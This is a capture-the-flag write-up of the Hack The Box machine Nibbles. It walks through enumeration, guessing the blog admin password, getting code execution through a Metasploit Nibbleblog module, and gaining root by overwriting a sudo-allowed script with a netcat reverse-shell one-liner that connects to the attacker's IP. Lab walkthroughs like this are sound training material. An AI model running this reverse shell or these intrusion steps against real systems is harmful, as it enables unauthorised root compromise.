---
title: "Nibbles — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for Nibbles Hackthebox Machine"
date: 2021-01-24 11:00:00 +0200
categories: [HackTheBox]
tags: [HTB, Linux]
---


## Introduction

![](/img/HTB/Nibbles/Nibbles.png)

Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.

#### Used Tools:
- Nmap
- Gobuster
- Searchsploit
- Metasploit
- Unzip

## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/Nibbles/img (1).png)

As seen there are 2 open ports, Port 20 for an SSH service and Port 80 for HTTP service, Let’s check the HTTP first…

![](/img/HTB/Nibbles/img (2).png)

This looks empty… Let’s check the page source

![](/img/HTB/Nibbles/img (3).png)

Simply it contain the header for the hello world title and a comment down inform us to go to `/nibbleblog/` as there is nothing here in this page, and here we go

![](/img/HTB/Nibbles/img (4).png)

After a lot of navigating through the website I found nothing every thing returns me to this home page.

So I google about nibbleblog and fount it is a powerful engine for creating blogs using PHP.

Let’s enumerate the directories using **gobuster**:

![](/img/HTB/Nibbles/img (5).png)

Of course the enumeration of the previous `http://10.10.10.75/` gives nothing important, but as expected the `http://10.10.10.75/nibbleblog/` gives us some promising directories as nibbleblog/admin.php and nibbleblog/README, so let’s check the README page…

![](/img/HTB/Nibbles/img (6).png)

It contain a description for the site and some installation guide which we won’t use bit it gaves us its version. Let’s check the nibbleblog/admin.php

![](/img/HTB/Nibbles/img (7).png)

After a quick google didn’t bring up a set of default credentials, I tried alot of default password with the username admin but it ended up being blacklisted by the application…

After waiting around a minute we’re taken off the blacklist and can access the login page once again. The general rule of thumb here is to think like a lazy sysadmin. After a few attempts I ended up finding the credentials `admin:nibbles`.


## 2. EXPLOITATION:

During i was stuck in the admin panel i searched for the Nibbleblog in the `searchsploit` for a public exploit:

![](/img/HTB/Nibbles/img (8).png)

I found an exploit `(38489)` with the exact version of our targeted nibbleblog as seen in the README file and the more interesting that it is supported by metasploit, The exploit: Nibbleblog contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code.

so let’s open **metasploit** and use it:

![](/img/HTB/Nibbles/img (9).png)

The exploit require a username and a password in it’s options so then i figured that we must have a username and password so i returned to the admin panel but now we have them so we will set the options and exploit it.

![](/img/HTB/Nibbles/img (10).png)

And the exploit succeeded, Now we have a **meterpreter** session

![](/img/HTB/Nibbles/img (11).png)

So let’s go to the / directory and then to the home directory where we will find a user file called nibbler, go through it we will find user.txt

BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!! Now we had a user flag :D


## 3. PRIVILEGE ESCALATION:

There are a lot of commands that couldn’t be done using the meterpreter shell so we can escape this by typing “shell” in the meterpreter shell… and then upgrade our shell using

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```

Now let’s list the user’s privileges using:

```bash
sudo -l
```

![](/img/HTB/Nibbles/img (12).png)

Here we go, our user (nibbler) can execute the bash script `monitor.sh with root privileges`, let’s check it…

Monitor.sh is in personal but it is zipped in the nibbler directory so we have to unzip it with the unzip tool

```bash
unzip personal.zip
```

![](/img/HTB/Nibbles/img (13).png)

Now we have 2 options:

- We **append** a reverse shell in the bash script so when it is executed as root the reverse shell will connect us as root
- We **overwrite** the monitor.sh file with the reverse shell

I will use the second one as it’s faster and easier...

```bash
echo ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.130 1234 >/tmp/f’ > monitor.sh
```

You’ll find this reverse shell payload on PayloadsAllTheThings then create a listener in other tab on the port 1234 then execute it as root using:
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

```bash
sudo -u root ./monitor.sh
```
![](/img/HTB/Nibbles/img (14).png)

BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D


Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***